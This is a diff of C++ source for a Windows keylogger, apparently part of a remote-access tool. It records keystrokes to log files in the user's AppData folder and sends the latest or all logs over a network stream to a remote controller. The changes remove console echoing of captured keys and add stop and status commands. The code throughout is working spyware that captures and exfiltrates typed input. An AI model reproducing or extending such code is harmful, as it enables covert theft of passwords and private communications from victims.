@@ -110,6 +110,8 @@ void KeyLogger::start() {
     }
 }
 
+
+
 bool KeyLogger::checkAltGr() {
     if (GetAsyncKeyState(VK_CONTROL) && GetAsyncKeyState(VK_MENU)) {
         return true;
@@ -119,30 +121,26 @@ bool KeyLogger::checkAltGr() {
 
 void KeyLogger::writeCharIntoLogFile(const char *string) {
     if (!std::filesystem::exists(pathOfLogs)) std::filesystem::create_directory(pathOfLogs);
-    std::ofstream myfile;
-    myfile.open(logsFileName.c_str(), std::fstream::app);
+    std::ofstream fileStream;
+    fileStream.open(logsFileName.c_str(), std::fstream::app);
     std::string detectedWindow = getCurrentWindow();
     if (tempWindow != detectedWindow && !detectedWindow.empty()) {
-        myfile << std::endl << "[" << getCurrentWindow() << "]";
         tempWindow = getCurrentWindow();
     }
-    std::cout << string;
-    myfile << string;
-    myfile.close();
+    fileStream << string;
+    fileStream.close();
 }
 
 void KeyLogger::writeCharIntoLogFile(char string) {
-    std::filesystem::create_directory(std::filesystem::path(pathOfLogs).parent_path());
-    std::ofstream myfile;
-    myfile.open(logsFileName.c_str(), std::fstream::app);
+    if (!std::filesystem::exists(pathOfLogs)) std::filesystem::create_directory(pathOfLogs);
+    std::ofstream fileStream;
+    fileStream.open(logsFileName.c_str(), std::fstream::app);
     std::string detectedWindow = getCurrentWindow();
     if (tempWindow != detectedWindow && !detectedWindow.empty()) {
         tempWindow = getCurrentWindow();
-        myfile << std::endl << "[" << getCurrentWindow() << "]";
     }
-    std::cout << string;
-    myfile << string;
-    myfile.close();
+    fileStream << string;
+    fileStream.close();
 }
 
 
@@ -160,43 +158,58 @@ bool KeyLogger::checkShift() {
     return false;
 }
 
-bool KeyLogger::isRecordingKeys() const {
-    return recordingKeys;
-}
 
-void KeyLogger::setRecordingKeys(bool isRecording) {
-    KeyLogger::recordingKeys = isRecording;
-}
-
-KeyLogger::KeyLogger(Stream stream, const std::string &subdirectoryName) :
-        stream(stream),
-        pathOfLogs(Install::getAppDataPath() + L"\\" + Converter::string2wstring(subdirectoryName) + L"\\") {
-
-}
 
 std::wstring KeyLogger::generateLogName() {
     return pathOfLogs + L"log_" + Time::getCurrentDateTimeW() + L".log";
 }
 
-bool KeyLogger::lastLogExists() {
+bool KeyLogger::lastLogExists() const {
     return std::filesystem::exists(logsFileName);
 }
 
-bool KeyLogger::logsExists() {
-    if (std::filesystem::exists(pathOfLogs) && !std::filesystem::is_empty(pathOfLogs)) return true;
-    return false;
+bool KeyLogger::logsExists() const {
+    return std::filesystem::exists(pathOfLogs) && !std::filesystem::is_empty(pathOfLogs);
+
 }
 
-void KeyLogger::sendKeyLoggerLog() {
-    stream.sendFile(logsFileName.c_str());
-    logsFileName = generateLogName();
+void KeyLogger::send() {
+    sendLastKeyloggerLog();
 }
 
-void KeyLogger::sendAllKeyLoggerLogs() const {
-    for (const auto &entry: std::filesystem::directory_iterator(pathOfLogs)) {
-        stream.sendSize(0);
-        if (std::filesystem::is_regular_file(entry)) stream.sendFile(entry.path().wstring().c_str());
-        stream.readSize();
+void KeyLogger::sendLastKeyloggerLog() {
+    if (lastLogExists()) {
+        stream.sendSize(1);
+        stream.sendFile(logsFileName.c_str());
+        logsFileName = generateLogName();
+    } else {
+        stream.sendSize(-1);
     }
-    stream.sendSize(-1);
+}
+
+void KeyLogger::sendAll() const {
+    if (logsExists()) {
+        stream.sendSize(1);
+        for (const auto &entry: std::filesystem::directory_iterator(pathOfLogs)) {
+            stream.sendSize(0);
+            if (std::filesystem::is_regular_file(entry)) stream.sendFile(entry.path().wstring().c_str());
+            stream.readSize();
+        }
+        stream.sendSize(-1);
+    } else {
+        stream.sendSize(-1);
+    }
+}
+
+void KeyLogger::sendState() const {
+    stream.sendSize(recordingKeys);
+}
+
+
+void KeyLogger::stopKeylogger(){
+    recordingKeys = false;
+}
+
+KeyLogger::KeyLogger(const Stream &stream) : Sender(stream) {
+    pathOfLogs = Install::getAppDataPath() + L"\\" + Converter::string2wstring(SUBDIRECTORY_FILE_NAME) + L"\\";
 }
